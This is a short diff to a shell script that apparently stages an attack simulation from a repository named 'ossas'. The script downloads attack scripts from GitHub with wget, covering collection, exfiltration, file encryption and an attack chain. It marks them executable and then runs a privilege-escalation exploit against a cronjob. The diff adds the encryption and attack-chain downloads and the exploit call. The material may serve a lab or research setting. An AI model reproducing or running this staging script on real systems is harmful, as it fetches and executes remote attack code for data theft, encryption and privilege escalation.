@@ -14,16 +14,20 @@ wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/file_and_di
 # Collection
 wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/collectiontarget.sh
 # Exfiltration
-wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/exfiltration_attk.sh
 wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/exfiltration_target.sh
 # Encryption
 wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/encryption/check.sh
+wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/encryption/encrypt.py
+# Attack chain
+wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/attack_chain.sh
 # Chmod execute
 chmod -R +x /home/resch/.scripts
 # Other files
 wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/encryption/requirements.txt
 wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/encryption/encrypt.py
-# Install requirements
-./check.sh
-pip3 install -r ./requirements.txt
+
+echo "Start of exploit...."
+echo "Running PE exploit for cronjob..."
+./PEexploit.sh
+
 
